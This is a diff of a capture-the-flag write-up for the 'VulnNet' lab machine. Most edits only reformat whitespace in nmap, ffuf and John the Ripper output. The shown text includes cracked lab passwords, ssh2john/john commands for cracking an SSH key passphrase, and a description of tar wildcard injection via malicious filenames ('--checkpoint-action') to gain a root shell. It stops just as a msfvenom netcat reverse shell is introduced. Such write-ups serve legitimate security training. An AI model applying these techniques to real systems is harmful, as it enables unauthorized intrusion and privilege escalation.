@@ -9,25 +9,25 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 ```
-PORT   STATE SERVICE REASON  VERSION
-22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
+| 2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
-|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
+| 256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
-|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
+| 256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
-80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
 |_http-title: VulnNet
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
 | http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
+|_ Supported Methods: GET HEAD POST OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
@@ -47,30 +47,30 @@ We can begin by fuzzing to check any hidden directories
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://vulnnet.thm/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://vulnnet.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://vulnnet.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 3833ms]
-css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 161ms]
-js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 159ms]
-fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 162ms]
+img [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 3833ms]
+css [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 161ms]
+js [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 159ms]
+fonts [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 162ms]
 ```
 
 
@@ -176,7 +176,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-9972761drmfsls   (developers)
+9972761drmfsls (developers)
 1g 0:00:00:10 DONE (2025-04-01 21:20) 0.09267g/s 200292p/s 200292c/s 200292C/s 9982..99686420
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -320,7 +320,7 @@ ssh2john id_rsa > id_rsa.hash
 
 john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
-oneTWO3gOyac     (id_rsa)
+oneTWO3gOyac (id_rsa)
 ```
 
 There we go, we got our passphrase, let's go into ssh now:
@@ -371,7 +371,7 @@ date
 ls -lh $dest
 ```
 
-This command backs upÂ **all files**Â in the directory. Since we control files inÂ `/home/server-management/Documents`, we can inject malicious filenames thatÂ `tar`Â interprets as command-line arguments (e.g.,Â `--checkpoint-action`Â to execute arbitrary code). Let's reproduce the following in order to get a root shell:
+This command backs up **all files** in the directory. Since we control files in`/home/server-management/Documents`, we can inject malicious filenames that`tar` interprets as command-line arguments (e.g.,`--checkpoint-action` to execute arbitrary code). Let's reproduce the following in order to get a root shell:
 
 ```
 # Let's begin by generating a netcat reverse shell using msfvenom
